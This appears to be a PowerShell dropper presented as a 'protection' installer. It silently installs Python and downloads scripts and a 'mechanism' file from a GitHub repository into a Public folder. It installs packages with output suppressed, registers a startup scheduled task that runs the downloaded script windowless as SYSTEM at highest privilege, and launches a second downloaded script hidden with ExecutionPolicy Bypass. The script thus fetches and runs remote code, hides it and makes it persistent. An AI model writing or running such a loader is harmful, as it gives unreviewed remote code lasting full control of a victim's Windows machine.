# Search the python executable
$pythonPath = Get-Command python -ErrorAction SilentlyContinue

# If python executable is not found, install python
if (-not $pythonPath) {
    # Define the URL for the Python installer
    $installerUrl = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
    
    # Define the path for the downloaded installer
    $installerPath = "$env:TEMP\python_installer.exe"

    # Download the Python installer
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

    # Install Python silently
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -NoNewWindow -Wait

    # Verify installation
    $pythonPath = Get-Command python -ErrorAction SilentlyContinue
    if ($pythonPath) {
    } else {
    }

    # Clean up
    Remove-Item -Path $installerPath -Force
} else {
}

# Fetch the python executable path
$pythonPath = [System.IO.Path]::GetDirectoryName($pythonPath.Source)
$pythonPath = "$pythonPath\python.exe"

######################################################## Here finish the python installation


# Download the python script directly with invoke-webrequest
$outDirectory = "C:\Users\Public\Other\Protection"
$logDirectory = "C:\Users\Public\Other\Schedule"
cd "$outDirectory"

# Check if the directory exists, and create it if not
if (-not (Test-Path -Path $outDirectory)) {
    New-Item -Path $outDirectory -ItemType Directory
} else {
}
if (-not (Test-Path -Path $logDirectory)) {
    New-Item -Path $logDirectory -ItemType Directory
} else {
}

$repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection3.py"
$runUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/run_protection.ps1"
$requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"

$scriptPath = "${outDirectory}/protection.py"
$runPath = "${outDirectory}/run_protection.ps1"
$requirementsPath = "${outDirectory}/requirements.txt"
$contentPath = "${outDirectory}/mechanism"

# Check if scriptPath already exists
if (Test-Path $scriptPath) {
    # If it exists, delete it
    Remove-Item $scriptPath -Force
}


# Try to make the web requests
try {
	# Download the repository and requirements
	Invoke-WebRequest -Uri $repoUrl -OutFile $scriptPath
	Invoke-WebRequest -Uri $runUrl -OutFile $runPath
	Invoke-WebRequest -Uri $requirementsUrl -OutFile $requirementsPath
	Invoke-WebRequest -Uri $contentUrl -OutFile $contentPath

    # Install the Python packages from requirements.txt
    & python -m pip install --upgrade pip *> $null
    & python -m pip install -r $requirementsPath *> $null


} catch {
    # Check if the file already exists
    if (Test-Path -Path $scriptPath) {
    } else {
    }
}

# Schedule Task for every startup
$TaskName = "ProtectPythonService"

# Check if the scheduled task exists
$scheduledTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue

if ($scheduledTask) {
    
    # Delete the existing task
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    
} else {
}

# Get the path to Python executable
$python_path = (Get-Command python).Definition

# Define the action
$batFilePath = "C:\Users\Public\startup_script.bat"
$pythonScriptPath = "C:\Users\Public\Other\Protection\protection.py"

# Create the .bat file
$batContent = "@echo off`npythonw `"$pythonScriptPath`""
$batContent | Set-Content -Path $batFilePath -Encoding ASCII

# Create a scheduled task to run at startup
$taskName = "PythonScriptAtStartup"
$taskDescription = "Runs a Python script at startup"

$action = New-ScheduledTaskAction -Execute "$batFilePath"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName $taskName -Description $taskDescription -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

# Run the PowerShell script immediately in the current session
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"C:\Users\Public\Other\Protection\run_protection.ps1`"" -WindowStyle Hidden

